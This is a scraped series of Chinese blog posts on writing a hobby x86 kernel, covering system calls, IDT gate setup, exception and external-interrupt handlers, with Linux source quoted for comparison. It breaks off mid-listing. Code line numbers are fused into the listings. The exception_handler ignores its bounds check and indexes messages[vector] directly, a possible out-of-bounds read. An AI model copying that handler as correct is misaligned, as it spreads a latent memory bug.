[ __NR_oldstat ] = sys_stat, [ __NR_lseek ] = (syscall_handler_t *) sys_lseek, [ __NR_getpid ] = sys_getpid, [ __NR_mount ] = um_mount, [ __NR_umount ] = sys_oldumount, [ __NR_setuid ] = sys_setuid16, ...... ...... 这里以sys_write举例说明 /fs/read_write.c 1234567891011121314asmlinkage ssize_t sys_write(unsigned int fd, const char __user * buf, size_t count)&#123; struct file *file; ssize_t ret = -EBADF; int fput_needed; file = fget_light(fd, &amp;fput_needed); if (file) &#123; ret = vfs_write(file, buf, count, &amp;file-&gt;f_pos); fput_light(file, fput_needed); &#125; return ret;&#125; 具体链接情况 这样就实现了一个系统调用 中断描述符 引发中断的方式 外中断 异常 软中断 外中断就是由外部中断控制器通知 CPU 需要执行的，CPU 在当前指令执行完成之后，回去检测是否有中断产生，如果有，并且 IF 位有效，也就是允许中断，那么就会执行中断处理函数，这种方式直接的体验就是，CPU 可以在任意两个指令间插入一个中断函数调用，中断函数调用与普通函数调用稍有区别，在调用时栈中多压了一些数据，在中断返回时，会弹出； 异常和软中断统称为内中断，也就是这个中断时 CPU 和 软件内部产生的，与外部硬件无关； 异常是 CPU 在执行过程中，执行不下去了，引发的中断调用，比如 除零异常，缺页异常，一般保护错误，有一些异常在处理后程序是可以继续执行的，比如缺页异常，而有一些异常就不行了，比如一般保护，这种情况下一般是软件访问了不该访问的内存或者寄存器，自己没有权限，于是CPU会调用一般保护异常函数，这个函数中，一般会终止该进程的执行，试图访问自己没有权限的内容，应该是危险的程序，可能是恶意程序，或者是程序有漏洞； 软中断，可以认为是应用程序和操作系统沟通的一种方式，应用程序运行在较低的特权级，一般来说没有直接访问硬件的权限，当应用程序想要访问硬件的时候，比如典型的读写文件，就需要调用系统调用，系统调用就是用软中断实现的，也就是应用程序调用软中断函数来请求操作系统，以访问硬件，访问硬件的函数是操作系统实现的，于是被认为是安全的，就这样。 从Linux源代码来看，当我们需要实现许多系统调用的时候，可以把所有的系统调用函数的地址写到一张函数表上，实现一个和linux差不多的系统调用表 对于每一个中断，我们需要一个中断描述符表(interrupte descriptor table. IDT) 在/arch/i386/boot/setup.S初始化了全局描述符和中断描述符 123456789101112131415161718192021222324252627#endif /* CONFIG_X86_VOYAGER */# set up gdt and idt lidt idt_48 # load idt with 0,0 xorl %eax, %eax # Compute gdt_base movw %ds, %ax # (Convert %ds:gdt to a linear ptr) shll $4, %eax addl $gdt, %eax movl %eax, (gdt_48+2) lgdt gdt_48 # load gdt with whatever is # appropriate# make sure any possible coprocessor is properly reset.. xorw %ax, %ax outb %al, $0xf0 call delay outb %al, $0xf1 call delay# well, that went ok, I hope. Now we mask all interrupts - the rest# is done in init_IRQ(). movb $0xFF, %al # mask all interrupts for now outb %al, $0xA1 call delay movb $0xFB, %al # mask all irq&#x27;s but irq2 which outb %al, $0x21 # is cascaded lgdt：加载全局描述符 lidt：加载中断描述符 中断描述符结构体 /arch/x86/kernel/idt.c 12345678910struct gate_struct &#123; u16 offset_low; u16 segment; struct idt_bits bits; u16 offset_middle;#ifdef CONFIG_X86_64 u32 offset_high; u32 reserved;#endif&#125; __attribute__((packed)); 至于最下面的offset_high和reserved都是留给x86_64的，所以我们可以定义如下结构体 src/include/xsys/interrupt.h 12345678910111213141516171819202122#ifndef XSYS_INTERRUPT_H#define XSYS_INTERRUPT_H#include &lt;xsys/types.h&gt;#define IDT_SIZE 256typedef struct gate_t&#123; u16 offset0; // 段内偏移 0 ~ 15 位 u16 selector; // 代码段选择子 u8 reserved; // 保留不用 u8 type : 4; // 任务门/中断门/陷阱门 u8 segment : 1; // segment = 0 表示系统段 u8 DPL : 2; // 使用 int 指令访问的最低权限 u8 present : 1; // 是否有效 u16 offset1; // 段内偏移 16 ~ 31 位&#125; _packed gate_t;void interrupt_init();#endif 之后就是初始化idt src/kernel/interrupt.c 12345678910111213141516171819202122void interrupt_init()&#123; for (size_t i = 0; i &lt; IDT_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; gate-&gt;offset0 = (u32)interrupt_handler &amp; 0xffff; gate-&gt;offset1 = ((u32)interrupt_handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; BMB; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; gate-&gt;type 0b0101 - 任务门 (Task Gate)：很复杂，而且很低效 x64 就去掉了这种门 0b1110 - 中断门 (Interrupt Gate) IF 位自动置为 0 0b1111 - 陷阱门 (Trap Gate) 同时模仿linux，有中断处理函数入口的程序 src/kernel/handler.asm 1234567891011121314151617181920[bits 32]; 中断处理函数入口 section .textextern printkglobal interrupt_handlerinterrupt_handler: xchg bx, bx push message call printk add esp, 4 xchg bx, bx iretsection .datamessage: db &quot;interrput test&quot;,10,0 我们可以创建255个系统中断，即255个IDT，使用bochs调试一下 而idt的地址：0x10900就是interrupt_handler 最后也被成功执行了 参考 https://www.cnblogs.com/LittleHann/p/3871630.html https://en.wikipedia.org/wiki/Interrupt_vector_table 操作系统实现-异常 简单实现 异常 故障 陷阱 终止 故障 Fault 这种错误是可以被修复的一种类型，属于最轻的一种异常； 陷阱 Trap 此异常通常用于调试 终止 Abort 是最严重的异常类型，一旦出现由于 错误无法修复，程序将无法继续运行 每个一场都需要一个中断，所以有30个中断，用到汇编宏(marco)去处理 src/kernel/handler.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159[bits 32]; 中断处理函数入口 extern handler_tablesection .text%macro INTERRUPT_HANDLER 2interrupt_handler_%1: xchg bx, bx%ifn %2 push 0x20222202%endif push %1; 压入中断向量，跳转到中断入口 jmp interrupt_entry%endmacrointerrupt_entry: ; 保存上文寄存器信息 push ds push es push fs push gs pusha ; 找到前面 push %1 压入的 中断向量 mov eax, [esp + 12 * 4] ; 向中断处理函数传递参数 push eax ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针 call [handler_table + eax * 4] ; 对应 push eax，调用结束恢复栈 add esp, 4 ; 恢复下文寄存器信息 popa pop gs pop fs pop es pop ds ; 对应 push %1 ; 对应 error code 或 push magic add esp, 8 iretINTERRUPT_HANDLER 0x00, 0; divide by zeroINTERRUPT_HANDLER 0x01, 0; debugINTERRUPT_HANDLER 0x02, 0; non maskable interruptINTERRUPT_HANDLER 0x03, 0; breakpointINTERRUPT_HANDLER 0x04, 0; overflowINTERRUPT_HANDLER 0x05, 0; bound range exceededINTERRUPT_HANDLER 0x06, 0; invalid opcodeINTERRUPT_HANDLER 0x07, 0; device not avilableINTERRUPT_HANDLER 0x08, 1; double faultINTERRUPT_HANDLER 0x09, 0; coprocessor segment overrunINTERRUPT_HANDLER 0x0a, 1; invalid TSSINTERRUPT_HANDLER 0x0b, 1; segment not presentINTERRUPT_HANDLER 0x0c, 1; stack segment faultINTERRUPT_HANDLER 0x0d, 1; general protection faultINTERRUPT_HANDLER 0x0e, 1; page faultINTERRUPT_HANDLER 0x0f, 0; reservedINTERRUPT_HANDLER 0x10, 0; x87 floating point exceptionINTERRUPT_HANDLER 0x11, 1; alignment checkINTERRUPT_HANDLER 0x12, 0; machine checkINTERRUPT_HANDLER 0x13, 0; SIMD Floating - Point ExceptionINTERRUPT_HANDLER 0x14, 0; Virtualization ExceptionINTERRUPT_HANDLER 0x15, 1; Control Protection ExceptionINTERRUPT_HANDLER 0x16, 0; reservedINTERRUPT_HANDLER 0x17, 0; reservedINTERRUPT_HANDLER 0x18, 0; reservedINTERRUPT_HANDLER 0x19, 0; reservedINTERRUPT_HANDLER 0x1a, 0; reservedINTERRUPT_HANDLER 0x1b, 0; reservedINTERRUPT_HANDLER 0x1c, 0; reservedINTERRUPT_HANDLER 0x1d, 0; reservedINTERRUPT_HANDLER 0x1e, 0; reservedINTERRUPT_HANDLER 0x1f, 0; reservedINTERRUPT_HANDLER 0x20, 0; clock 时钟中断INTERRUPT_HANDLER 0x21, 0INTERRUPT_HANDLER 0x22, 0INTERRUPT_HANDLER 0x23, 0INTERRUPT_HANDLER 0x24, 0INTERRUPT_HANDLER 0x25, 0INTERRUPT_HANDLER 0x26, 0INTERRUPT_HANDLER 0x27, 0INTERRUPT_HANDLER 0x28, 0INTERRUPT_HANDLER 0x29, 0INTERRUPT_HANDLER 0x2a, 0INTERRUPT_HANDLER 0x2b, 0INTERRUPT_HANDLER 0x2c, 0INTERRUPT_HANDLER 0x2d, 0INTERRUPT_HANDLER 0x2e, 0INTERRUPT_HANDLER 0x2f, 0; 下面的数组记录了每个中断入口函数的指针section .dataglobal handler_entry_tablehandler_entry_table: dd interrupt_handler_0x00 dd interrupt_handler_0x01 dd interrupt_handler_0x02 dd interrupt_handler_0x03 dd interrupt_handler_0x04 dd interrupt_handler_0x05 dd interrupt_handler_0x06 dd interrupt_handler_0x07 dd interrupt_handler_0x08 dd interrupt_handler_0x09 dd interrupt_handler_0x0a dd interrupt_handler_0x0b dd interrupt_handler_0x0c dd interrupt_handler_0x0d dd interrupt_handler_0x0e dd interrupt_handler_0x0f dd interrupt_handler_0x10 dd interrupt_handler_0x11 dd interrupt_handler_0x12 dd interrupt_handler_0x13 dd interrupt_handler_0x14 dd interrupt_handler_0x15 dd interrupt_handler_0x16 dd interrupt_handler_0x17 dd interrupt_handler_0x18 dd interrupt_handler_0x19 dd interrupt_handler_0x1a dd interrupt_handler_0x1b dd interrupt_handler_0x1c dd interrupt_handler_0x1d dd interrupt_handler_0x1e dd interrupt_handler_0x1f dd interrupt_handler_0x20 dd interrupt_handler_0x21 dd interrupt_handler_0x22 dd interrupt_handler_0x23 dd interrupt_handler_0x24 dd interrupt_handler_0x25 dd interrupt_handler_0x26 dd interrupt_handler_0x27 dd interrupt_handler_0x28 dd interrupt_handler_0x29 dd interrupt_handler_0x2a dd interrupt_handler_0x2b dd interrupt_handler_0x2c dd interrupt_handler_0x2d dd interrupt_handler_0x2e dd interrupt_handler_0x2f src/include/xsys/interrupt.h 1234567891011121314151617181920212223#ifndef XSYS_INTERRUPT_H#define XSYS_INTERRUPT_H#include &lt;xsys/types.h&gt;#define IDT_SIZE 256typedef struct gate_t&#123; u16 offset0; // 段内偏移 0 ~ 15 位 u16 selector; // 代码段选择子 u8 reserved; // 保留不用 u8 type : 4; // 任务门/中断门/陷阱门 u8 segment : 1; // segment = 0 表示系统段 u8 DPL : 2; // 使用 int 指令访问的最低权限 u8 present : 1; // 是否有效 u16 offset1; // 段内偏移 16 ~ 31 位&#125; _packed gate_t;typedef void *handler_t; // 中断处理函数void interrupt_init();#endif src/kernel/interrupt.c 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/assert.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)// #define LOGK(fmt, args...)#define ENTRY_SIZE 0x30#define PIC_M_CTRL 0x20 // 主片的控制端口#define PIC_M_DATA 0x21 // 主片的数据端口#define PIC_S_CTRL 0xa0 // 从片的控制端口#define PIC_S_DATA 0xa1 // 从片的数据端口#define PIC_EOI 0x20 // 通知中断控制器中断结束gate_t idt[IDT_SIZE];pointer_t idt_ptr;handler_t handler_table[IDT_SIZE];extern handler_t handler_entry_table[ENTRY_SIZE];static char *messages[] = &#123; &quot;#DE Divide Error\\0&quot;, &quot;#DB RESERVED\\0&quot;, &quot;-- NMI Interrupt\\0&quot;, &quot;#BP Breakpoint\\0&quot;, &quot;#OF Overflow\\0&quot;, &quot;#BR BOUND Range Exceeded\\0&quot;, &quot;#UD Invalid Opcode (Undefined Opcode)\\0&quot;, &quot;#NM Device Not Available (No Math Coprocessor)\\0&quot;, &quot;#DF Double Fault\\0&quot;, &quot; Coprocessor Segment Overrun (reserved)\\0&quot;, &quot;#TS Invalid TSS\\0&quot;, &quot;#NP Segment Not Present\\0&quot;, &quot;#SS Stack-Segment Fault\\0&quot;, &quot;#GP General Protection\\0&quot;, &quot;#PF Page Fault\\0&quot;, &quot;-- (Intel reserved. Do not use.)\\0&quot;, &quot;#MF x87 FPU Floating-Point Error (Math Fault)\\0&quot;, &quot;#AC Alignment Check\\0&quot;, &quot;#MC Machine Check\\0&quot;, &quot;#XF SIMD Floating-Point Exception\\0&quot;, &quot;#VE Virtualization Exception\\0&quot;, &quot;#CP Control Protection Exception\\0&quot;,&#125;;void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); while(true);&#125;// 初始化中断描述符，和中断处理函数数组void interrupt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; 在start.asm中写一个int 0x80超出范围调用 src/kernel/start.asm 123456789[bits 32]extern kernel_initglobal _start_start: call kernel_init int 0x80 jmp $ 可以看到已经把参数都压进去了，根据判断启动了第13号默认调用 再是一个除0异常 src/kernel/start.asm 12345678910[bits 32]extern kernel_initglobal _start_start: call kernel_init mov bx, 0 div bx jmp $ 异常列表 编号 名称 类型 助记符 错误码 0 (0x0) 除零错误 故障 #DE 无 1 (0x1) 调试 故障/陷阱 #DB 无 2 (0x2) 不可屏蔽中断 中断 - 无 3 (0x3) 断点 陷阱 #BP 无 4 (0x4) 溢出 陷阱 #OF 无 5 (0x5) 越界 故障 #BR 无 6 (0x6) 指令无效 故障 #UD 无 7 (0x7) 设备不可用 故障 #NM 无 8 (0x8) 双重错误 终止 #DF 有 (Zero) 9 (0x9) 协处理器段超限 故障 - 无 10 (0xA) 无效任务状态段 故障 #TS 有 11 (0xB) 段无效 故障 #NP 有 12 (0xC) 栈段错误 故障 #SS 有 13 (0xD) 一般性保护异常 故障 #GP 有 14 (0xE) 缺页错误 故障 #PF 有 15 (0xF) 保留 - - 无 16 (0x10) 浮点异常 故障 #MF 无 17 (0x11) 对齐检测 故障 #AC 有 18 (0x12) 机器检测 终止 #MC 无 19 (0x13) SIMD 浮点异常 故障 #XM/#XF 无 20 (0x14) 虚拟化异常 故障 #VE 无 21 (0x15) 控制保护异常 故障 #CP 有 22-31 (0x16-0x1f) 保留 - - 无 Linux是怎样做到的 官方说明：https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html Below we can find Linux IRQ vector layout. The first 32 entries are reserved for exceptions, vector 128 is used for syscall interface and the rest are used mostly for hardware interrupts handlers. 这是linux对不同中断编号的分类 在复习下之前的操作系统实现-系统中断的内容，我们在这篇博客里面是实现的异常处理，再Linux上对应的编号是0~31 /arch/x86/include/asm/irq_vectors.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/* SPDX-License-Identifier: GPL-2.0 */#ifndef _ASM_X86_IRQ_VECTORS_H#define _ASM_X86_IRQ_VECTORS_H#include &lt;linux/threads.h&gt;/* * Linux IRQ vector layout. * * There are 256 IDT entries (per CPU - each entry is 8 bytes) which can * be defined by Linux. They are used as a jump table by the CPU when a * given vector is triggered - by a CPU-external, CPU-internal or * software-triggered event. * * Linux sets the kernel code address each entry jumps to early during * bootup, and never changes them. This is the general layout of the * IDT entries: * * Vectors 0 ... 31 : system traps and exceptions - hardcoded events * Vectors 32 ... 127 : device interrupts * Vector 128 : legacy int80 syscall interface * Vectors 129 ... LOCAL_TIMER_VECTOR-1 * Vectors LOCAL_TIMER_VECTOR ... 255 : special interrupts..... *//* This is used as an interrupt vector when programming the APIC. */#define NMI_VECTOR 0x02/* * IDT vectors usable for external interrupt sources start at 0x20. * (0x80 is the syscall vector, 0x30-0x3f are for ISA) */#define FIRST_EXTERNAL_VECTOR 0x20/* * Reserve the lowest usable vector (and hence lowest priority) 0x20 for * triggering cleanup after irq migration. 0x21-0x2f will still be used * for device interrupts. */#define IRQ_MOVE_CLEANUP_VECTOR FIRST_EXTERNAL_VECTOR#define IA32_SYSCALL_VECTOR 0x80/* * Vectors 0x30-0x3f are used for ISA interrupts. * round up to the next 16-vector boundary */#define ISA_IRQ_VECTOR(irq) (((FIRST_EXTERNAL_VECTOR + 16) &amp; ~15) + irq)/* * Special IRQ vectors used by the SMP architecture, 0xf0-0xff * * some of the following vectors are &#x27;rare&#x27;, they are merged * into a single vector (CALL_FUNCTION_VECTOR) to save vector space. * TLB, reschedule and local APIC vectors are performance-critical. */#define SPURIOUS_APIC_VECTOR 0xff/* * Sanity check */#if ((SPURIOUS_APIC_VECTOR &amp; 0x0F) != 0x0F)# error SPURIOUS_APIC_VECTOR definition error#endif#define ERROR_APIC_VECTOR 0xfe#define RESCHEDULE_VECTOR 0xfd#define CALL_FUNCTION_VECTOR 0xfc#define CALL_FUNCTION_SINGLE_VECTOR 0xfb#define THERMAL_APIC_VECTOR 0xfa#define THRESHOLD_APIC_VECTOR 0xf9#define REBOOT_VECTOR 0xf8/* * Generic system vector for platform specific use */#define X86_PLATFORM_IPI_VECTOR 0xf7/* * IRQ work vector: */............/* * Size the maximum number of interrupts. * * If the irq_desc[] array has a sparse layout, we can size things * generously - it scales up linearly with the maximum number of CPUs, * and the maximum number of IO-APICs, whichever is higher. * * In other cases we size more conservatively, to not create too large * static arrays. */#define NR_IRQS_LEGACY 16#define CPU_VECTOR_LIMIT (64 * NR_CPUS)#define IO_APIC_VECTOR_LIMIT (32 * MAX_IO_APICS)#if defined(CONFIG_X86_IO_APIC) &amp;&amp; defined(CONFIG_PCI_MSI)#define NR_IRQS \\ (CPU_VECTOR_LIMIT &gt; IO_APIC_VECTOR_LIMIT ? \\ (NR_VECTORS + CPU_VECTOR_LIMIT) : \\ (NR_VECTORS + IO_APIC_VECTOR_LIMIT))#elif defined(CONFIG_X86_IO_APIC)#define NR_IRQS (NR_VECTORS + IO_APIC_VECTOR_LIMIT)#elif defined(CONFIG_PCI_MSI)#define NR_IRQS (NR_VECTORS + CPU_VECTOR_LIMIT)#else#define NR_IRQS NR_IRQS_LEGACY#endif#endif /* _ASM_X86_IRQ_VECTORS_H */ 接着就是三种门： On x86 an IDT entry has 8 bytes and it is named gate. There can be 3 types of gates: interrupt gate, holds the address of an interrupt or exception handler. Jumping to the handler disables maskable interrupts (IF flag is cleared). trap gates, similar to an interrupt gate but it does not disable maskable interrupts while jumping to interrupt/exception handler. task gates (not used in Linux) 这个gate就是中断描述符的结构体，具体门的有三种：中断门、陷阱门、任务门(没有再Linux上使用) 同时文档也向我们说明了IDT_Entry（即：门）的属性 Let’s have a look at several fields of an IDT entry: segment selector, index into GDT/LDT to find the start of the code segment where the interrupt handlers reside offset, offset inside the code segment T, represents the type of gate DPL, minimum privilege required for using the segments content. 要有一个段选择子，能够将从全局描述符表和和中断描述符表找到对应的内存和中断函数(imnterrupt handlers) 在代码段中的偏移 门类型的代表 使用该段信息的最小权限值 所以我们写除了代码： 1234567891011typedef struct gate_t&#123; u16 offset0; // 段内偏移 0 ~ 15 位 u16 selector; // 代码段选择子 u8 reserved; // 保留不用 u8 type : 4; // 任务门/中断门/陷阱门 u8 segment : 1; // segment = 0 表示系统段 u8 DPL : 2; // 使用 int 指令访问的最低权限 u8 present : 1; // 是否有效 u16 offset1; // 段内偏移 16 ~ 31 位&#125; _packed gate_t; 同时的Linux实现： /arch/x86/include/asm/desc_defs.h 12345678910struct gate_struct &#123; u16 offset_low; u16 segment; struct idt_bits bits; u16 offset_middle;#ifdef CONFIG_X86_64 u32 offset_high; u32 reserved;#endif&#125; __attribute__((packed)); 从上面得知我们需要对gate有初始化 所以写了 12345678910111213141516171819202122232425262728void interrupt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; 对应的Linux中有：（这也只是其中一种） /arch/x86/boot/compressed/idt_64.c 12345678910111213141516static void set_idt_entry(int vector, void (*handler)(void))&#123; unsigned long address = (unsigned long)handler; gate_desc entry; memset(&amp;entry, 0, sizeof(entry)); entry.offset_low = (u16)(address &amp; 0xffff); entry.segment = __KERNEL_CS; entry.bits.type = GATE_TRAP; entry.bits.p = 1; entry.offset_middle = (u16)((address &gt;&gt; 16) &amp; 0xffff); entry.offset_high = (u32)(address &gt;&gt; 32); memcpy(&amp;boot_idt[vector], &amp;entry, sizeof(entry));&#125; 还需要一个函数来帮助gate的段选择子找到相对应的系统调用号，这个函数被称为interrupt_handler 这里我们实现的是异常，所以是exception_handler 123456789101112131415void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); while(true);&#125; 同时我门在跳转的时候需要使用栈来保存相关信息，并且要记录系统调用号对应的函数地址，对于有的报错需要压入一些值到栈里面 As can be seen in the figure below, an interrupt pushes the EFLAGS register before saving the address of the interrupted instruction. Certain types of exceptions also cause an error code to be pushed on the stack to help debug the exception. CPU checks the current privilege level if need to change privilege level change stack with the one associated with new privilege save old stack information on the new stack save EFLAGS, CS, EIP on stack save error code on stack in case of an abort execute the kernel interrupt handler To resume the execution after an interrupt the following sequence is used (x86): pop the error code (in case of an abort) call IRET pops values from the stack and restore the following register: CS, EIP, EFLAGS if privilege level changed returns to the old stack and old privilege level 所以也有了handler.asm中的handler_entry_table那么长一串，以及 1234567891011121314151617181920212223242526272829303132interrupt_entry: ; 保存上文寄存器信息 push ds push es push fs push gs pusha ; 找到前面 push %1 压入的 中断向量 mov eax, [esp + 12 * 4] ; 向中断处理函数传递参数 push eax ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针 call [handler_table + eax * 4] ; 对应 push eax，调用结束恢复栈 add esp, 4 ; 恢复下文寄存器信息 popa pop gs pop fs pop es pop ds ; 对应 push %1 ; 对应 error code 或 push magic add esp, 8 iret 同样的在Linux中也有，但是他的实现更加的复杂 不过仍然能找到/arch/x86/kernel/entry_32.S（其他版本可能实现地方不同，这是2.6内核版本的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778.macro TRACE_IRQS_IRET#ifdef CONFIG_TRACE_IRQFLAGS testl $X86_EFLAGS_IF,PT_EFLAGS(%esp) # interrupts off? jz 1f TRACE_IRQS_ON1:#endif.endm....../* * User gs save/restore * * %gs is used for userland TLS and kernel only uses it for stack * canary which is required to be at %gs:20 by gcc. Read the comment * at the top of stackprotector.h for more info. * * Local labels 98 and 99 are used. */#ifdef CONFIG_X86_32_LAZY_GS /* unfortunately push/pop can&#x27;t be no-op */.macro PUSH_GS pushl_cfi $0.endm.macro POP_GS pop=0 addl $(4 + \\pop), %esp CFI_ADJUST_CFA_OFFSET -(4 + \\pop).endm.macro POP_GS_EX.endm /* all the rest are no-op */.macro PTGS_TO_GS.endm.macro PTGS_TO_GS_EX.endm.macro GS_TO_REG reg.endm.macro REG_TO_PTGS reg.endm.macro SET_KERNEL_GS reg.endm.......macro GS_TO_REG reg movl %gs, \\reg /*CFI_REGISTER gs, \\reg*/.endm.macro REG_TO_PTGS reg movl \\reg, PT_GS(%esp) /*CFI_REL_OFFSET gs, PT_GS*/.endm.macro SET_KERNEL_GS reg movl $(__KERNEL_STACK_CANARY), \\reg movl \\reg, %gs.endm#endif /* CONFIG_X86_32_LAZY_GS */.macro SAVE_ALL cld PUSH_GS pushl_cfi %fs /*CFI_REL_OFFSET fs, 0;*/ pushl_cfi %es /*CFI_REL_OFFSET es, 0;*/ pushl_cfi %ds /*CFI_REL_OFFSET ds, 0;*/ pushl_cfi %eax CFI_REL_OFFSET eax, 0 pushl_cfi %ebp CFI_REL_OFFSET ebp, 0.......macro RESTORE_INT_REGS popl_cfi %ebx...... 对应的64位：/arch/x86/kernel/entry_64.S 参考 https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/ 操作系统实现-外中断 代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 up的原视频直接开始将源代码了，但是我操作系统没学好怎么办，赶紧查外中断是个啥 中断的种类有： 异常 外中断 软中断 UP的图总结的非常好 在上一篇我们实现的是异常，这里实现的是外中断，有了外中断我们就可以做一些输入了 比如： 键盘按下一个按钮（其实感兴趣的话不妨去了解了解TTY(TeleTypeWriter)） 键盘芯片通过数据总线向CPU传递信号，要求CPU暂停，从死循环跳出（中断），转到来处理这个按钮所出发的时间 CPU处理完成后返回原来的执行流 这里描绘一下8086PC机键盘处理过程 CPU一直在检测中断 键盘按下，发出终端扫描码0x1E，被I/O接口的0x60端口上 I/O接口触发9号中断通过数据总线送到CPU的中断逻辑中，并且将信号通过数据总线发送到数据缓冲寄存器中 CPU会根据标志寄存器IF位判断，是1就响应，0则等待，中断逻辑检测到9号中断，触发9号中断处理程序(这个处理程序就是我们要写的)，电路级别的是从CPU内部实现的，信号传递是通过CPU针脚传递 同时CPU将键盘信号0x1E转为ASCII码0x61 再将0x1E和0x61组合送到内存-键盘缓冲区中（ASCII地位，信号高位） 最后CPU向键盘发送应答信息 最开始的PS2协议的键盘(圆头的)就是通过这种方式进行输入的 所以我们需要做相当多的关于硬件的操作，有点像计组了 src/include/xsys/interrupt.h 定义了一些中断编号 1234567891011121314151617#define IRQ_CLOCK 0 // 时钟#define IRQ_KEYBOARD 1 // 键盘#define IRQ_CASCADE 2 // 8259 从片控制器#define IRQ_SERIAL_2 3 // 串口 2#define IRQ_SERIAL_1 4 // 串口 1#define IRQ_PARALLEL_2 5 // 并口 2#define IRQ_FLOPPY 6 // 软盘控制器#define IRQ_PARALLEL_1 7 // 并口 1#define IRQ_RTC 8 // 实时时钟#define IRQ_REDIRECT 9 // 重定向 IRQ2#define IRQ_MOUSE 12 // 鼠标#define IRQ_MATH 13 // 协处理器 x87#define IRQ_HARDDISK 14 // ATA 硬盘第一通道#define IRQ_HARDDISK2 15 // ATA 硬盘第二通道#define IRQ_MASTER_NR 0x20 // 主片起始向量号#define IRQ_SLAVE_NR 0x28 // 从片起始向量号 src/kernel/interrupt.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/printk.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)// #define LOGK(fmt, args...)#define ENTRY_SIZE 0x30#define PIC_M_CTRL 0x20 // 主片的控制端口#define PIC_M_DATA 0x21 // 主片的数据端口#define PIC_S_CTRL 0xa0 // 从片的控制端口#define PIC_S_DATA 0xa1 // 从片的数据端口#define PIC_EOI 0x20 // 通知中断控制器中断结束gate_t idt[IDT_SIZE];pointer_t idt_ptr;handler_t handler_table[IDT_SIZE];extern handler_t handler_entry_table[ENTRY_SIZE];static char *messages[] = &#123; &quot;#DE Divide Error\\0&quot;, &quot;#DB RESERVED\\0&quot;, &quot;-- NMI Interrupt\\0&quot;, &quot;#BP Breakpoint\\0&quot;, &quot;#OF Overflow\\0&quot;, &quot;#BR BOUND Range Exceeded\\0&quot;, &quot;#UD Invalid Opcode (Undefined Opcode)\\0&quot;, &quot;#NM Device Not Available (No Math Coprocessor)\\0&quot;, &quot;#DF Double Fault\\0&quot;, &quot; Coprocessor Segment Overrun (reserved)\\0&quot;, &quot;#TS Invalid TSS\\0&quot;, &quot;#NP Segment Not Present\\0&quot;, &quot;#SS Stack-Segment Fault\\0&quot;, &quot;#GP General Protection\\0&quot;, &quot;#PF Page Fault\\0&quot;, &quot;-- (Intel reserved. Do not use.)\\0&quot;, &quot;#MF x87 FPU Floating-Point Error (Math Fault)\\0&quot;, &quot;#AC Alignment Check\\0&quot;, &quot;#MC Machine Check\\0&quot;, 